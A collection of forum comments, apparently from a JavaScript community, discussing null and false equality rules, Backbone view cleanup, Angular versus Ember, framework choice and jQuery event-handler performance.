&gt; this.listenTo(...) Setting listeners explicitly like this leaves references that need to be cleaned up later. So if you remove or overwrite your view from the DOM, you have to also clean up the reference (stopListening()) otherwise you end up with memory leaks and "zombie views" which hang around in memory and continue to responding to events forever, soaking up CPU cycles. Hence this extension, which takes a pretty radically different approach, and you can just "fire and forget" subscriptions. Plus then you're guaranteed that only views living in the DOM respond to events.
Wow. Do more please!
I have absolutely no use for this on the industry I work on. But it looks amazing and now I'm excited. Thanks OP :)
Event handling is built into BB. See [my attempt to explain the reasoning for this alternate approach](https://github.com/greim/Backbone-Subscriptions#core-concepts).
 typeof null // object typeof false // boolean &gt; If the two operands are not of the same type, JavaScript converts the operands then applies strict comparison. If either operand is a number or a boolean, the operands are converted to numbers if possible; else if either operand is a string, the other operand is converted to a string if possible. If both operands are objects, then JavaScript compares internal references which are equal when operands refer to the same object in memory. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Comparison_Operators 
In JavaScript, `null` and `false` are both "falsy" values, as are `0`, all `NaN` values (there are many NaNs), `""`, and `undefined`. In other words, these are all treated as a "false" value when used where a boolean value is required, such as in an `if` statement or a conditional expression. But that doesn't mean they are all the same value or will compare equal to each other. They are all different values. There is one special case: `null` and `undefined` will compare equal with `==`, unlike `===` where they and these other values compare unequal. `NaN` is also an interesting case. All `NaN` values are "falsy", but they are also all *unequal* to each other. For example, `0/0` is `NaN` which is falsy, but `0/0 === 0/0` is *`false`*! *Why* does it work this way? It's pretty much arbitrary. Most programming languages have some idea of "truthy" and "falsy" values, but exactly which values go into which category is fairly arbitrary and differs from language to language. For example, in Ruby, the only falsy values are `false` and `nil` (which corresponds to JavaScript's `null`). All other values, including `0` and `""`, are truthy. I believe the `NaN` thing isn't just a JavaScript quirk, but part of how IEEE754 floating point numbers (as used in all modern computers) are specified. In Ruby, `0.0/0.0` is `NaN`, but as in JavaScript, `0.0/0.0 == 0.0/0.0` is `false`.
Yep, all comparisons with NaN are false, which is part of the IEEE 754 spec. Object.is is coming in ES6 which will get around that. Polyfill: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/is#Compatibility Edit: It also occurs to me that, since when comparing a number and string both operands are coerced to numbers, comparisons like "foo" == NaN would be true otherwise.
That doesn't quite seem to explain it. It suggests that since one operator is a boolean, both operands would be coerced to numbers, and since Number(null) and Number(false) are both zero, null == false would be true. I bet there's another rule that takes precedence that says that null and undefined only == themselves and each other. Also, http://zero.milosz.ca/ is a good resource for stuff like this.
Not quite. It's a primitive value itself, and is generally used to represent a 'non-object' where an object is expected. An example of this is the fact that it is the base of the JS prototype chain, at Object.prototype.\_\_proto__. It's also non-strictly equal to the primitive value undefined, which is more commonly used as the default value for something that hasn't been set. But neither of them mean 'no value', really.
Javascript was designed in two weeks. You shouldn't expect too much rationale, the equalities are tricky, for no good reasons.
=== Always.
Yield is just syntactical sugar. You can write generators without this and do async operations with libraries like [ASync](https://github.com/caolan/async). The authors section titled, "Coming From Mars", is the reason crap like this is being shoehorned into javascript (I'm looking at you Class keyword).
why not just convert the type? !null == !undefined !0 // true !"" // true !undefined // true !1 // false !"0" // false !{} // false Then you can do lazy checking like this var x; // some deterministic code that may not set a value to x if (!!x){ // do stuff } 
 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; #container { width: 1010px; height: 600px; border: 1px solid black; background-color: #FFFFFF; overflow: hidden; position: relative; margin: 0px auto; } .block { position: absolute; background-color:#abc; width:240px; height:400px; margin: 0px; margin-top: 5%; } #box1 { left: -240px; } #box2 { left: 10px; } #box3 { left: 260px; } #box4 { left: 510px; } #box5 { left: 760px; } &lt;/style&gt; &lt;script src="http://code.jquery.com/jquery-1.9.1.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id="right"&gt;&amp;raquo;&lt;/button&gt; &lt;div id = "container"&gt; &lt;div class="block" id = "box1"&gt;&lt;/div&gt; &lt;div class="block" id = "box2"&gt;&lt;/div&gt; &lt;div class="block" id = "box3"&gt;&lt;/div&gt; &lt;div class="block" id = "box4"&gt;&lt;/div&gt; &lt;div class="block" id = "box5"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script&gt; $(document).ready( function() { var imgIter = 0; var iter = 5; var posEnd = 0; for(imgIter = 0; imgIter &lt; 5; imgIter++){ //keeps track of which of the 25 images you're using for(iter = 5; iter &gt; 0; iter--){ $("#box1").animate({"left": "+=400px"}, 5000, 'linear', queue: false); $("#box2").animate({"left": "+=400px"}, 5000, 'linear', queue: false); $("#box3").animate({"left": "+=400px"}, 5000, 'linear', queue: false); $("#box4").animate({"left": "+=400px"}, 5000, 'linear', queue: false); $("#box5").animate({"left": "+=400px"}, 5000, 'linear', queue: false, function() { var posEnd = $("#box"+iter).position().left; alert("binding a function to "+posEnd); if(posEnd == 1010) { //if it's too far right, as in 1310 pictures from the left $("#box"+iter).remove( function(){ //remove it $("#container").prepend("#box"+iter).css("left","-1500px"); //add it to the other side inside container $("#box"+iter).prepend('&lt;img src="image'+imgIter+'.jpg" /&gt;'); //add image inside the box+ID }); } else { } }); imgIter++; } } }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 
Yeah Backbone's minimalism definitely has its pros and cons. But in my day job I'm stuck with it for the time being, hence this extension :)
Good for you for finding/fixing this issue and then giving it back to the community :).
If you liked null != false, you'd have loved VBScript where vbNull &lt;&gt; vbDbNull &lt;&gt; vbEmpty &lt;&gt; vbNothing &lt;&gt; 0 &lt;&gt; False...
I'm not sure why you'd expect this. Null is the null object and false is a boolean. There isn't any reason to expect them to be the same value. In fact, in languages where they are the same value, like Common Lisp, I consider it to be a major wart. Can you elaborate on why you expect this to be the case? Perhaps that will illuminate further questions which will be clarifying. 
You've stumbled upon one of the petrified ~~bugs~~ unexpected behaviors of ECMAscript. Along with *number*, *string*, *boolean*, *object* and *undefined*, *null* is one of the primitive values of javascript. If *typeof* were consistent, then "typeof null" would return *null*. However, way back in the beginning, someone made the debatable decisions that it would return *object* and now we are stuck with it. Edit: You would probably enjoy [*The Javascript Trilogy*](http://www.youtube.com/playlist?list=PL5586336C26BDB324) by Douglas Crockford on YouTube. Though some of the material is now out of date, he answers this and many other questions in the lectures.
just an fyi, it isn't an identity operator. they are both equality operators, one allows for coercion, one doesn't
I had to go to the ecmascript spec to answer this one. Here's the listed behavior of the == operator: &gt; 1. If Type(x) is the same as Type(y), then &gt; a. If Type(x) is Undefined, return true. &gt; b. If Type(x) is Null, return true. &gt; c. If Type(x) is Number, then &gt; i. If x is NaN, return false. &gt; ii. If y is NaN, return false. &gt; iii. If x is the same Number value as y, return true. &gt; iv. If x is +0 and y is -0, return true. &gt; v. If x is -0 and y is +0, return true. &gt; vi. Return false. &gt; d. If Type(x) is String, then return true if x and y are exactly the same sequence of characters (same length and same characters in corresponding positions). Otherwise, return false. &gt; e. If Type(x) is Boolean, return true if x and y are both true or both false. Otherwise, return false. &gt; f. Return true if x and y refer to the same object. Otherwise, return false. &gt; 2. If x is null and y is undefined, return true. &gt; 3. If x is undefined and y is null, return true. &gt; 4. If Type(x) is Number and Type(y) is String, return the result of the comparison x == ToNumber(y). &gt; 5. If Type(x) is String and Type(y) is Number, return the result of the comparison ToNumber(x) == y. &gt; 6. If Type(x) is Boolean, return the result of the comparison ToNumber(x) == y. &gt; 7. If Type(y) is Boolean, return the result of the comparison x == ToNumber(y). &gt; 8. If Type(x) is either String or Number and Type(y) is Object, return the result of the comparison x == ToPrimitive(y). &gt; 9. If Type(x) is Object and Type(y) is either String or Number, return the result of the comparison ToPrimitive(x) == y. &gt; 10. Return false. The first rule we hit is #6, so the comparison becomes 0 == null, and we work through the list again. The next rule we *might* hit is #8, because null is an object, right? But it turns out that internally, null belongs to the Null type, not the Object type, so #8 doesn't match. Neither does #9. Which leaves us with #10, the catch-all, that returns false. So to answer your question: The language didn't account for that particular case, and so defaults to false.
Dr. Douglas Crockford explains well in his book "Javascript the Good Parts", you should always use "===" for comparison. 
Marionette is definitely a pretty nice collection of tools. The main difference between this and Marionette's event handling for views is that Marionette [calls unbind() for you](https://github.com/marionettejs/backbone.marionette/blob/master/docs/marionette.view.md#view-close). Whereas here, nobody calls unbind() because there's no concept of unbind. The normal evolution of the DOM tree—with elements being removed or overwritten as needed—doubles as your reference cleanup. I'm not trying to denigrate Marionette, just want to avoid the perception that this is a re-hash of its event implementation, since at core it uses a pretty different approach.
It was a bug in Netscape that the IE JScript team copied. When JS was standardized, they left it in as to not break sites depending on this bug. ಠ_ಠ
Wild guess here since you don't provide much. Your field variable may actually be an object and not a string. You may need to use something like field.name .
That's icky.
Wow. This smells of the same stuff PHP gets a bad rap for but everyone seems to have nothing but love for JavaScript.... ? 
Because 0 == false and "" == false, also because if (null) {console.log("huh")} else {console.log("yea")} logs yea. So one could normally expect that null would be one of those things that gets converted to false.
You always remove the view by calling `View.remove()` this inplace calls `stopListening()` so I don't see how leak could happen.
And here's the relevant section in [Annotated ECMAScript](http://es5.github.io/): http://es5.github.io/#x9.12
For bonus points, maybe someone can explain: !(null == false || null &gt; false) &amp;&amp; (null &gt;= false) It is not the case that null is equal to false or that null is greater than false, yet null *is* greater-than-or-equal to false!? EDIT: oh, probably because greater-than-or-equals is converting them both to numbers and (null != false) &amp;&amp; (1 * null == 1 * false) &amp;&amp; (null == undefined) &amp;&amp; (1 * null != 1 * undefined)
I'm not sure I understand the purpose of your inquiry. Chances are you already know that it doesn't behave like an object created with {}, and you seem to already have the rest of the answers. You might mean whether it's implemented in a way similar to a regular object in VMs. I suppose you could dig into their source and documentations and see what each of them does. But this is irrelevant to the language semantics. I wouldn't be surprised if objects had a variety of implementations for purposes of optimization. An equally pointless question would be whether functions are just "special objects", or "distinct entitites". You can't get an "IS" answer, only a list of their similarities, differences, their typeofs, their prototype chains, and whatever the spec says.
Regardless of the oddity of the null value of object type, it's easy to have things which are not instanceof Object, because Object is just one particular ctor with one particular prototype (which happens to be at the root of most things). Object.prototype instanceof Object // false A prototype is not instanceof its own ctor. Object.create(null) instanceof Object // false An object with no prototype is not instanceof anything. function Foo() {} Foo.prototype = Object.create(null); new Foo() instanceof Foo // true new Foo() instanceof Object // false An object which doesn't have an inheritance chain ending in Object.prototype is not instanceof Object. document.body.appendChild(document.createElement('iframe')) .contentWindow.eval('({})') instanceof Object An object from another frame was created using that frame's own copy of Object.prototype, which has no particular relationship to the one this frame knows. If you want to know “is this an object” as in “is this thing a bundle of named properties etc.” then the most reliable test is — drumroll please... Object(foo) === foo because Object used as a function coerces its argument into a real object in some sense. (Primitives get wrapped, null gets turned into a new object.) This test will also permit functions, as functions are pretty much objects with an extra “callable” nature. (In fact, the spec says that *anything* which is callable must have typeof === "function".)
You'll want to look at "The Abstract Relational Comparison Algorithm": http://es5.github.io/#x11.8.5
I think there may be some JavaScript optimizations they can make like using Typed Arrays. Since JavaScript code is compiled down to optimized native code, there are optimizations for different circumstances that can make vast differences in performance.
&gt; nothing but love for JavaScript You seem to have missed CoffeeScript, Go, Dart, etc...
&gt; You always remove the view by calling View.remove() This assumes you have a reference to the view in your current scope in the first place, which you don't unless you deliberately set things up that way. Then, you have to actually remember to call remove() every time, which in my experience somebody will eventually forget to do in a complex software project. You ultimately have to add an entire extra layer of logic—for example Backbone Marionette's region manager—to manage all of these references for you in a consistent way. To me, that seems like too much complexity and is what drove me to look for a simpler solution.
I wrote this sprite sheet animation tool for my javascript game engine, and I decided to add support for exporting to CreateJS/EaselJS and ImpactJS. The tool can be used to quickly design and preview sprite sheet animations. It allows libraries of animations to be built up and exported. SpriteSheets are added through drag &amp; drop. [Here](http://www.leshylabs.com/blog/posts/2013-06-13-Leshy_SpriteSheet_Animator.html) is the initial blog post with documentation and a feature list. [Here](http://www.leshylabs.com/blog/posts/2013-06-16-EaselJS_and_ImpactJS_Support_for_Leshy_SpriteSheet_Animator.html) is a new blog post that goes over the export features and formats. I have tested the EaselJS export support, and it worked well. I don't have an ImpactJS license, but I followed the documentation, so I think it should work. 
I usually configure my applications using command-line arguments with commander.js. It allows using the application in all sorts of environments easily. The calling application/script determines the configuration. This only applies when there is a limited set of configuration-values. When there is a lot to configure I've used a different index.js (so to say), which passes on different values to the actual main module. Not sure whether this is perfect in any sense, but it gives the user of the main module a lot of control. The user uses the main module like a library. Passing on functions is also possible that way.
Step 1 is following the official tutorial. Amazing.
Well, if you forget to call `remove()` then a lot of bad things can happen — besides listening to external event emitters (like your subscrpiptions) view usually listen on models, so zombie views will emerge. I don't use Marionette but have no problem removing views by calling `.remove()` – DOM manipulation which crosses borders of other views is a bad idea. Backbone.View is made specifically to encapsulating a part of the DOM into a self-contained piece of functionality.
This article is amazing. An Ember developer--coming from a massive 28k LoC framework with a host of criticisms regarding feature creep--attacks Angular--a slimmer (14k) but still conceptually complex, feature rich technology--as being "too simple." &gt;I think it’s clear at this point that Angular’s focus on simplicity has some serious consequences. I can't stop laughing. You think Angular is _simple??_ Its elegant parts make use of some cool but complex stuff. It would be _one_ thing if the article went on to find a good code example where Angular's 'simplicity' caused a train wreck. All he has is: &lt;p&gt;{{area}} sq ft.&lt;/p&gt; is better than &lt;p&gt;{{area()}} sq ft.&lt;/p&gt; --- And: console.log(room.inhabitant.name); is worse than console.log(room.get('inhabitant.name')); Sure, both of those things are better. Are they really so much better that "it's not even close"? --- The hell of it is, he makes a pretty good point about Angular's dirty checking, so far as I'm concerned. Dirty checking can be a problem in a single-threaded environment, and leads to weird behavior in general with Angular's HTML markup. But c'mon, tell us how Ember solves that problem. Is it through using requirejs-similar injection? App.Room = Ember.Object.extend({ area: function() { return this.get('width') * this.get('height'); }.property('width', 'height') &lt;------------------------------- }); Is that really enough? Is the run loop so much superior to Angular's $digest cycle? --- &gt;&gt;In fact, what is idiomatic AngularJS? None of the examples or blogs I read through demonstrated how to reuse object instances, for example. What the hell is idiomatic Ember? Ember _just_ hit 1.0.0 (apparently). 
I mean, this is what's so bizarre about javascript right now. One massive framework attacks a completely different massive framework, and if you know nothing about $digest cycles or computed properties or run loops or dirty checking--Quick, which ones belong to Angular, which to Ember? -- you won't know what to take away. Arguably Angular had this problem, but it's acquired the momentum necessary to make serious traction. Ember has a long way to go. 
[Learn Angular in 1 step](https://www.google.com/search?btnG=1&amp;pws=0&amp;q=Angular+tutorials) (I made that link as a joke, but many of the steps are actually in that search.)
 I just learned angular...and it's really easy and amazing to me but please someone tell me the problems with it? 
I think most of these bloggers are just riding the AngularJS gravy train for hits to their blog. Most of everything I see is starter tutorial regurgitation. 
Step 1: Learn AngularJS Step 2: Write something in AngularJS Step 3: ??? Step 4: Profit.
ive been working on an angular application that has to deal with massive amounts of data (think of purchase orders, ship notices, invoices that need to be sent out to walmart, kroger, target scale). although i have had issues here and there all you really need to know is what angular is currently monitoring(usually you expose the mutable parts of your models) and exposing that to the angular runtime while hiding what it doesn't need to know.
Ember isn't even 1.0.0. It's at 1.0.0 release candidate 5. I'm not really familiar with Angular, but the maintenance hassles of having to know whether a property is computed or not when I'm trying to work on templates sound sooooooo bad. I have no problem looking it up, but if a non-programming design person is working on templates? I'm not sure what you mean by requirejs-similar injection, but Ember.Object properties are interacted with via getters and setters, so when a computed property is computed, the result is pretty much cached, until you use a setter on one of the properties that it lists as a dependency, or one of the dependencies is recalculated.
The concept of writing directives ~~alludes~~ eludes a lot of people and they get turned off by that. The documentation can be a bit hard to understand as well. The best thing you could do for your Web development skills is stick with it though. It's an amazing framework. 
I agree with your area example It is a matter of context. You can't just expect the framework to do it all for you. You are the developer. You should be judging not simply by what makes your own life slightly easier. You should always think about the end product
&gt; frameworks like Ember, Angular, Backbone, Node and etc Node doesn't actually belong in this list. Node is a server-side JS environment, in the same way that browsers are client-side JS environments. I mean "environment" in that they each provide JS language runtimes and also a built-in standard library. Ember, Angular and Backbone are libraries that people built that are meant to run within an environment—in this case browsers. There are lots of libraries meant to be run on Node, and some libraries meant to be able to run in either Node or in browsers.
It depends on what you want to do with. If you want to use Js for build a complete application, you can go to [Todomvc](http://todomvc.com/) first, which demonstrates the same application (a simple to-do list) implemented with various different frameworks. It offers the following guidance on how to make the selection that is right for you :p But if you want only some web page customisations, you can try to start with jQuery :)
The web app landscape is in turmoil. There are a lot of different means of organizing and designing your code, and we're trying a lot of different approaches to them. No one knows exactly what the best approach is. Good luck! You're as lost as any of us. Ember and Angular are really big frameworks that are strongly opinionated. Backbone is opinionated in subtler ways, I think. I might be biased, but I highly recommend reading the Backbone source, both as a means to learning and understanding javascript but also as a means of getting a grasp on web development in general. 
There are many frameworks out there simply because people like to do things differently. The main thing that they are all trying to solve is to make development easier (maintainable in the long run) for applications. Each one of these frameworks (not Node) tackles this differently. I suggest creating a test app (e.g. todo list) yourself with whatever knowledge you currently have &amp; then re-implement the app with different frameworks to get a feel for how they do things. You can take a look at [TodoMVC](http://todomvc.com/) which has a Todo application built in a lot of frameworks...but to be honest, unless you read each frameworks docs &amp; write out the code yourself at this stage you won't learn much just by looking at the examples. Also, if you have time, add [knockoutjs](http://knockoutjs.com/) to your list of frameworks to look at. It's a powerful framework that is sadly under appreciated for w/e reason. They have great docs, examples &amp; screencast or two.
As a new grad who recently started working as a web developer, where we will be using angular from now on, I find myself excited to work with such a cool technology and scared at the same time as it just seems so complex to learn.
It just seems like everyone turns out a JS library every other day, like Facebook with their react library. Also, I understand node is the outlier in that list (hence the except ;) ). Do you think knowing most if not all of these major frameworks is really that important to be successful in web development? Edit: I've heard from a lot of people to look into Backbone's source code. Being used to Java and Python, the OOP standard in JS is kind of odd. Looking in to Backbone's source code would be very very useful.
What did I miss? 
The significant minority of people who think that JavaScript is broken and built another level of abstraction on top of it to fix all the crap?
The best advice I can give you is practice writing directives. The best way to do it is integrate your favourite jQuery Libraries into AngularJS by creating your own directives to do it. You will most likely already find directives for a specific jQuery Library but just use them as a blueprint. Try to write most of it yourself. Also, have a look at all these videos. They helped me out a ton! - http://egghead.io If you ever need any help, send me a PM and I'll try and help out :).
It is indeed! You probably [don't even need jquery](http://substack.net/weaning_yourself_off_jquery). I find it's much more worthwhile to use tiny libraries that only do one thing instead of dozens of unrelated things at once. This way you can always pick the best tool for the job instead of whatever tools somebody else with on knowledge of your problem thought you will need.
Yeah.... I embrace it... In php too... my point is the MINORITY don't like JS... The majority seem to hate on php
You established a 'significant minority' find JavaScript broken... It seems to me that a significant *majority* find php broken. In my original comment I expressed surprise that this kind of issue is why that majority hate php, but only a minority seem to hate on JavaScript. Perhaps I exaggerated 'nothing but love'...
yeah, you need to slap a /s mark on something like "nothing but love" if you don't literally mean "everybody loves javascript".
Can someone tell me what the "delta" is in the ant code (and other places). I can't seem to tell where the step function is ever called. 
Josh explains the fundamental difference between jQuery &amp; Backbone [here](http://stackoverflow.com/a/9730645). I couldn't say it any better. s/Backbone/(Ember|Angular|Knockout)/ 
Yea, it's fairly poor article. Dirty Checking will go away with `Object.observe`.
The funny thing is, I think we're on the tail end of the new framework wave. React is barely squeezing in, and its reception has been pretty negative. &gt;Do you think knowing most if not all of these major frameworks is really that important to be successful in web development? No. I do it, because I want to be involved in the forefront, you know? But everything's changing so fast that now that investing in one of these technologies is betting that framework will win. Which is, of course, why Angular and Ember have such a huge disadvantage. That said, if you're looking to see a difference between Java/Python and javascript, you should look at Backbone's extend function. The way that extend is put onto every Backbone class (Backbone.Event, Backbone.Model, Backbone.Collection, etc.) when it itself is the functionality of inheritance was eye-opening for me.
Yeah. That's pretty much correct. Those calls to "property" set up a dependency tree, so stuff at the top knows to update if stuff below it is modified. It's also telling Ember that the method is to be treated as a property, which exposes it to templates and stuff. What's nice about it is that you can have properties that are dependent on another object, but only recalculate when the relevant properties on that object change. Modified from: http://emberjs.com/guides/object-model/computed-properties-and-aggregate-data/ App.todosController = Ember.Object.create({ todos: [ Ember.Object.create({ description: "Learn Angular", isDone: false }) ], remaining: function() { var todos = this.get('todos'); return todos.filterProperty('isDone', false).get('length'); }.property('todos.@each.isDone') }); In that case, the "remaining" property only recalculates when the "isDone" properties change on objects in the todos array, and not, say, when you update a description. This can lead to its own maintenance problems, though, having to update the dependencies list any time you change how a property is calculated.
Large scale JS application development experience is attractive to employers. This is really only going to be possible if you're using a framework or a few libraries beyond just JQuery. When I say "large scale" I'm talking situations where you might have hundreds or thousands of .js files with a complete underlying architecture and inter-dependent parts. These environments will feature things like unit testing and continuous integration... preferably as part of an Agile team. ... JavaScript is a BIG world nowadays.
My take on this is that client side web programming has just been starting to get to the point where the demands placed on it require the kind of development maturity that's been around for a while for things like desktop applications. The problem is that the old status quo (i.e. JQuery callback soup) scales really poorly, and it's difficult to maintain and build on top of. After a problem's been identified, there are a lot of different opinions on how to address it, and the multitude of frameworks you're looking at now is the result. The different frameworks vary a lot in terms of how prescriptive they are, among other things. The key thing, I think, is that it's generally going to be easier to teach someone to use a framework that abstracts away a lot of the pitfalls of using JavaScript than it is to teach them to get really good at vanilla JavaScript.
Any way to test it without Google? &amp;nbsp; ^fuck&amp;nbsp;the&amp;nbsp;nsa
I say this because you seem to think Google's betting particularly on ES6 when it clearly isn't: Do you think that Google's counting on Dart, Angular, Web components, ES6 (Object.observe), and every single wish anyone has for the future of javascript all at the same time? Don't excuse a flaw just because it has a theoretical solution. 
The real answer that people don't like to admit is because far too many developers today are (a) lazy, (b) incompetent or (a)+(b) to varying degrees. I can't tell you how many "experienced", "professional" web developers I've interviewed over the last two years who tell me "I'm a great web developers, I know jQuery, I'm really good", and then I ask them "What's the difference between setTimeout() and setInterval()?" and I get "Umm, err, well, I don't know". Of COURSE you don't know: you don't actually know JavaScript! You learned jQuery only! That's like a Java developer learning Hibernate without ever learning SQL or JDBC... sure, you can accomplish things, and you might even be fairly productive most of the time... but the FIRST time you have to go outside the framework you know, you're screwed and now you're a liability. It's a sad state of affairs really, and the continued reliance and development of all these frameworks and libraries is only perpetuating the problem. Don't misunderstand me here: I'm *NOT* saying these things don't have a place and you shouldn't use them at all. What I *AM* saying is that you damned well better know JavaScript itself. And, if you do, you just might find that you don't actually *NEED* most of these libraries and frameworks most of the time.
Google can bet on whatever it wants, I'm betting on projects like Harmony.js for backwards compatible ES6 applications. And I wasn't dismissing it; merely knowledging that this issue will go away in future. Big picture-wise, dirty checking has never been an issue for my apps performance or for my productivity. 
No. Ember adds the property method to Function. You can also use Ember without these so-called monkey patches. In this case, you would initialize an Ember.ComputedProperty instance with the function.
I agree with you 100%...as long as you meant JQuery instead of Angular.
I totally echo your feelings here. These mega-frameworks make me feel uneasy because inevitably, when something goes wrong, you will end up needing to comprehend and debug the whole framework, soup to nuts. Added complexity is added complexity, regardless of it's good intentions. Even when there is no problem, if you try to use the system in a way that the developers didn't anticipate, you end up having to do many questionable things to get things working, and will be stuck maintaining those kludges. That's even more fun when the underlying system changes over time. source: I was a drupal developer for almost a decade. 
Ok, so just so I'm clear: Ember runs first in your generic browser runtime, and adds certain things to standard javascript objects such that this works. (A core language modification.) Or, you can manually force that on some part of your code (if you're familiar with Ember) If you have the time, I'd point you do how React implements its JSX tags, and how you code without them. 
[Rails is omakase, and so is Ember.JS.](http://david.heinemeierhansson.com/2012/rails-is-omakase.html) I've tried your à la carte, and it didn't suit my tastebuds. At all.
I like this article, very well put.
I will be adding more login providers soon since it is done with node-passport adding extra login options should be simple. I'll do facebook, twitter and perhaps a couple of others which support openId.
As a jQuery developer who doesn't know AngularJS or Ember, I don't consider using jQuery that "crazy" (as he puts it) for the example case. This is how I'd do it: var $rows=$(".row"); $rows.click(function() { $rows.removeClass("selected"); $(this).addClass("selected"); }); Am I missing anything? That wouldn't have any performance issues that Angular wouldn't, would it?
Sure I suppose it all gets cached to local storage anyway. I'll add that after work tonight check back tomorrow it should be implemented.
&gt; I'm not sure I understand the purpose of your inquiry. I get the impulse to ask: "why are you asking?" but really, don't you hate when people ask you that? Again, I get it --- there are those cases that are like someone that's lost asking how to get to highway XYZ, they REALLY want to know how to get to their destination and they think highway XYZ is the best way to get there. You want to find out their destination because they might be wrong about highway XYZ being their road to victory, and so telling them how to get there wont actually help them all that much. In this case, however, it seems to be a curiosity/desire to fully understand JavaScript (insofar as JS can be understood ;p). Typically, the "asking the wrong question" type doesn't link to the ECMA standards docs. Also, this: &gt;This all started from my trying to understand why (null == false) === false. But I think I need to understand this first.
It's the cambrian explosion of JS libraries.
And I hate tutorials/articles that say "Here's how to do &lt;something awesome&gt; in pure Javascript! First, download these 7 javascript libraries, then type in these 4 lines of code! awesome!!"
There is a dedicated node for creating a sinewave in the API, creating a custom node for that is *very* inefficient. https://dvcs.w3.org/hg/audio/raw-file/tip/webaudio/specification.html#OscillatorNode
There is definitely a difference between a framework and a library, but it's not as simple as "include A has X number of features, include B has X-N number of features, A must be a framework and B is just a library." A framework informs how you write your code; it says, "we've solved these complicated problems for you, but you have to stay on this carefully-manicured path through the wilderness." A library typically doesn't tell you how to write your code, it tells you how to integrate the library with the code you've already written.
Well, the point here isn't really how to create a sine wave specifically, but to show how easy it is to stream values from javascript into the device context. But good that you pointed it out, I will update my blog post pointing this out.
Are you familiar with the idea of a framework in general?
Honestly, in the past 10 years we've seen a lot of dogmatic bickering over which of the latest Javascript frameworks is "better" when really all the bickering is about which should be more popular. Anybody remember the jQuery, YUI, and Dojo war? Same story; a bunch of dogmatic developers bickering over which is better, while the rest used the one they could: * Wrap their heads around. * Find good tutorials and documentation. * Provided the flexibility they needed. Personally, I feel like Dojo was the best pick, but jQuery won the popularity contest for some damn good reasons.
Crazy was the wrong word. As you app gets more complex, code like that gets much more complex. Imagine if you had 4 tables on the page, and 2 of them could only have one row selected between the 2. Now imagine you had to add another table to the page at a later date. There would likely be some edge case you forgot about. It's just much easier when the framework can manage it for you.
And if [you don't like reading...](http://www.youtube.com/watch?v=E99FnoYqoII) (I actually like that essay, but the video is still funny)
I don't really understand your argument that Backbone isn't a framework. Backbone includes all of the qualities of a [standard software framework](http://en.wikipedia.org/wiki/Software_framework). I'm assuming you haven't used it, however, since you mention that it doesn't cover client-side routing (untrue, see Backbone.Router) and that it provides M and C (when it's actually M and V... although that could have been a typo).
Learning all of the frameworks is a daunting and possibly unrealistic task. I think it is more important to understand the problems these frameworks were developed to solve and how they solve them you will have a better understanding of Javascript and its abilities and limitations. 
You are also forgetting the fact that you need to deal with memory leaks (zombie views anyone?). With those frameworks you really don't have to worry about that those too hard. 
Or maybe I'm not a JavaScript developer primarily... If I need to know I'll find out. But yes setInterval() is hilarious when you make a mistake and your code becomes recursive. If I need to go outside the framework I go and read a few chapters on Safari Books online anyway. Require.JS is my fave currently, that way I can load whatever plug-in or frame work I need and it won't step all over my namespace.
null === false and null == false, both evaluate to false, so I don't see your zealotism for === very relevant.
This discussion is entirely missing Knockout.js, which I find much simpler and easier to understand than Angular, which here is claimed to be the simpler solution..
Here is a direct link to a Codepen if you want to play a bit with it! http://codepen.io/maelp/pen/FIGEk
I believe those are only being run once, on creation of the function.
Very nice!
I made some slight adjustments and now it's only doing that on initialization. It's more sane now :)
Your belief is correct. The `kwargs()` method is added to `Function.prototype` and runs only at the time you call this method. In typical use this would be at the time you create the function. There is extra code that is run on every function invocation; it's [the inner function in lines 42-65](https://github.com/serkanyersen/kwargsjs/blob/master/kwargs.js#L42). That code looks like it should be reasonably efficient, although this statement bugs me a bit: if (kwargs === Object(kwargs)) ... 
Thanks, I tested it with comments around arguments, minified and all other versions. it works correctly. I haven't tested on IE though but I don't see any reason why it shouldn't work there.
it's what underscore.js uses for isObject method. AFAIK it's very efficient, can you explain why it can be a problem, I'll try to fix that.
Lol, that sucks. If it makes you feel any better, my all-time highest rated post had a glaring typo in the title as well. So embarrassing… -_-
I believe you want to check that kwargs is undefined, not if it is an object.
Checking only undefined is not enough, I also have to know if it's an object or not.
I don't need to check if it's undefined or not because I'm getting the last argument, unless no argument was sent, there will always be a value in there. all I need to know is if the last argument is an object or not. 
Oh, mystery solved! You were right about [the code as it existed when you commented](https://github.com/serkanyersen/kwargsjs/blob/90ebfb15c7fe539e3e555187ecd98e4acc56aeb7/kwargs.js); it's been fixed since then to run that code once.
Wouldn't some minifiers change the parameter names to shorter names?
Just for fun I checked [Lo-Dash](http://lodash.com/). It has an interesting implementation of `isObject`: /** Used to determine if values are of the language type Object */ var objectTypes = { 'boolean': false, 'function': true, 'object': true, 'number': false, 'string': false, 'undefined': false }; function isObject(value) { // check if the value is the ECMAScript language type of Object // http://es5.github.com/#x8 // and avoid a V8 bug // http://code.google.com/p/v8/issues/detail?id=2291 return !!(value &amp;&amp; objectTypes[typeof value]); } 
Which part is inefficient? The [click](http://api.jquery.com/click/) call is just a shortcut for the .on() method.
I agree there are definitely places using a framework is better. But I'm only talking about the example they gave. He said to have a row change color when it's selected, and said it was crazy to use jQuery for that. That was what I was disagreeing with. Not any other scenario.
Here's a quick [jsPerf](http://jsperf.com/click-vs-on-many) with only 100 rows, and the results will only grow farther apart with the addition of more rows. For Chrome: * click() = 1,517 ops/sec. * on() = 74,964 ops/sec. This is primarily due to the fact that in the .on() method, [the last statement calls this.each()](https://github.com/jquery/jquery/blob/master/src/event.js#L779). For your example, it will iterate `N` items (e.g. the length of `$rows`) and apply the event handler to each item it iterates. In my example, there is only 1 element (`#container`) to iterate and apply the handler to. In other words, this is functionally equivalent to your code: $(".row").each(function(i, row) { $(row).on('click', function() { // ... }); }); Another problem with yours which isn't exposed in the jsPerf profile, is this line: $rows.removeClass("selected"); Once again, that will invoke quite a bit more code than simply keeping a reference somehow to the last item which needs to be toggled.
jquery is vastly easier to get "stuff" done with, unfortunately that stuff ends up being garbage code that is unmaintainable. But who wants to support code anyway :P It's easier just to write it and leave it. 
